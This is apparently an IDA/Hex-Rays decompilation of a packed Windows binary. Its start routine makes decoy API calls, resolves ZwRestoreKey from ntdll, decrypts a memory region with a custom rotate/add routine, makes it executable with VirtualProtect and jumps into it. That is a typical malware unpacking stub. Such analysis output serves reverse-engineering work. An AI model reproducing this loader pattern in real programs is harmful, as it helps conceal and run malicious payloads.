/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void start();
void __stdcall sub_425E9B(_DWORD *, unsigned int, int);

//-------------------------------------------------------------------------
// Data declarations

// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern UINT (__stdcall *GetOEMCP)();
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HGLOBAL (__stdcall *LoadResource)(HMODULE hModule, HRSRC hResInfo);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern UINT (__stdcall *GetACP)();
_UNKNOWN unk_429000; // weak
CHAR aTwpbyMz0[] = "Twpby.mZ0"; // idb
CHAR FileName[] = "qkjjdbLi3qixeR.4C0"; // idb
CHAR LibFileName[] = "ntdll.dll"; // idb
CHAR ProcName[] = "ZwRestoreKey"; // idb


//----- (00425C9A) --------------------------------------------------------
void start()
{
  int (*ZwRestoreKey)(void); // eax
  int v1; // edx
  void *v2; // [esp-1Ch] [ebp-50h]
  _DWORD *v3; // [esp-18h] [ebp-4Ch]
  HMODULE LibraryA; // [esp-14h] [ebp-48h]
  unsigned int v5; // [esp-14h] [ebp-48h]
  int v6; // [esp-10h] [ebp-44h]
  int flOldProtect[3]; // [esp+28h] [ebp-Ch] BYREF

  GetCommandLineW();
  GetACP();
  GetCommandLineW();
  GetACP();
  LibraryA = LoadLibraryA(LibFileName);
  GetCommandLineA();
  ZwRestoreKey = GetProcAddress(LibraryA, ProcName);
  v6 = ZwRestoreKey();
  GetCommandLineW();
  while ( 1 )
  {
    v5 = 36362;
    v3 = &unk_429000;
    GetCommandLineA();
    v2 = 0;
    while ( CreateFileA(FileName, 0xC0000000, 1u, 0, 3u, 0x84u, v2) == (HANDLE)-1 )
    {
      sub_425E9B(v3, v5, v6);
      GetCurrentThreadId();
      GetFileType((HANDLE)0xFFFFFFFF);
      CloseHandle((HANDLE)0xFFFFFFFF);
      GetOEMCP();
      SizeofResource(0, (HRSRC)0xFFFFFFFF);
      GetACP();
      GetFileType((HANDLE)0xFFFFFFFF);
      VirtualProtect(&unk_429000, 0x8E0Au, 0x40u, (PDWORD)flOldProtect);
      SizeofResource(0, (HRSRC)0xFFFFFFFF);
      if ( LoadResource(0, (HRSRC)0xFFFFFFFF) )
        break;
      GetCurrentThreadId();
      GetCommandLineA();
      if ( CreateFileA(aTwpbyMz0, 0xA0000000, 6u, 0, 3u, 0x24u, 0) == (HANDLE)-1 )
      {
        SizeofResource(0, (HRSRC)0xFFFFFFFF);
        *(_DWORD *)(v1 + 1181779341) = v1;
        JUMPOUT(0x42902E);
      }
    }
  }
}
// 429028: control flows out of bounds to 42902E
// 425D20: variable 'v2' is possibly undefined
// 425D37: variable 'v3' is possibly undefined
// 425D37: variable 'v5' is possibly undefined
// 425D37: variable 'v6' is possibly undefined
// 429028: variable 'v1' is possibly undefined
// 425C9A: using guessed type DWORD flOldProtect[3];

//----- (00425E9B) --------------------------------------------------------
void __stdcall sub_425E9B(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // ebx

  v4 = a2 >> 2;
  do
  {
    *a1 += a3;
    *a1 = __ROL4__(*a1, 17);
    *a1 = -*a1;
    *a1 += a3;
    *a1 -= 272779949;
    *a1 = __ROR4__(*a1, 169);
    *a1 += 859507525;
    *a1 -= a3;
    *a1 = -*a1;
    *a1++ += a3;
    --v4;
  }
  while ( v4 );
}
// 425E9B: could not find valid save-restore pair for ebx

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
